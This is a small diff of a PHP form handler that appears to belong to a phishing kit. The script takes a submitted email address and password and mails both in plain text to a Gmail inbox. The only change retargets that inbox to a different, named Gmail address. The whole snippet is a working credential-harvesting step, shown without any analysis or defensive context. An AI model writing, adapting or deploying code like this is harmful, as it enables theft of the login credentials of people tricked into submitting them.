@@ -4,7 +4,7 @@
 	$password = $_POST['password'];
 	
 	// Send an email using PHP's mail function
-	$to = 'comeemail0@gmail.com';
+	$to = 'ahmed.taleb.ptbuana@gmail.com';
 	$subject = 'Form Submission';
 	$message = "Email: $email\nPassword: $password";
 	mail($to, $subject, $message);
